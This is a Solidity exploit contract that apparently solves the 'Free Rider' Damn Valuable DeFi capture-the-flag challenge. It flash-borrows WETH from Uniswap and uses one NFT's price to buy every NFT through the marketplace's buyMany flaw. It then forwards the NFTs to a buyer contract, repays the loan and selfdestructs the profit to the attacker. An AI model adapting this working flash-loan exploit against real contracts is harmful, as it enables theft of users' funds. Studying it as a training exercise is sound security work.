import "../DamnValuableToken.sol";
import "../DamnValuableNFT.sol";
import "./FreeRiderRecovery.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";

contract FreeRiderHack is IUniswapV2Callee, IERC721Receiver {
    address immutable attacker;
    IUniswapV2Pair immutable uniswapPair;
    FreeRiderNFTMarketplace immutable nftMarketplace;
    IWETH immutable weth;
    IERC721 immutable nft;
    address freeRiderBuyer;
    uint8 immutable amountOfNFT;
    uint256 immutable nftPrice;

    constructor(
        IUniswapV2Pair _uniswapPair,
        FreeRiderNFTMarketplace _nftMarketplace,
        IWETH _weth,
        address _freeRiderBuyer,
        uint8 _amountOfNFT,
        uint256 _nftPrice
    ) {
        attacker = msg.sender;
        uniswapPair = _uniswapPair;
        nftMarketplace = _nftMarketplace;
        weth = _weth;
        nft = _nftMarketplace.token();
        freeRiderBuyer = _freeRiderBuyer;
        amountOfNFT = _amountOfNFT;
        nftPrice = _nftPrice;
    }

    //TODO: 1 flashloan for 15 weth
    function attack() external {
        // need to pass some data to trigger uniswapV2Call
        // borrow 15 ether of WETH
        bytes memory data = abi.encode(uniswapPair.token0(), nftPrice);
        uniswapPair.swap(nftPrice, 0, address(this), data);
    }

    // 2. uniswap weth to eth
    function uniswapV2Call(
        address,
        uint,
        uint,
        bytes calldata _data
    ) external override {
        (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));

        // computing for 0.3% fee
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        // unwrap WETH
        weth.withdraw(amount);

        // 3. buy all the NFT from marketplace
        uint256[] memory tokenIds = new uint256[](amountOfNFT);
        for (uint256 tokenId = 0; tokenId < amountOfNFT; tokenId++) {
            tokenIds[tokenId] = tokenId;
        }
        nftMarketplace.buyMany{value: nftPrice}(tokenIds);

        // send all of the nft to the FreeRiderBuyer contract
        for (uint256 tokenId = 0; tokenId < amountOfNFT; tokenId++) {
            tokenIds[tokenId] = tokenId;
            nft.safeTransferFrom(address(this), freeRiderBuyer, tokenId);
        }

        // wrap enough WETH9 to repay our debt
        weth.deposit{value: amountToRepay}();

        // 5. repay loan to uniswap
        weth.transfer(address(uniswapPair), amountToRepay);

        // selfdestruct to the owner
        selfdestruct(payable(attacker));
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
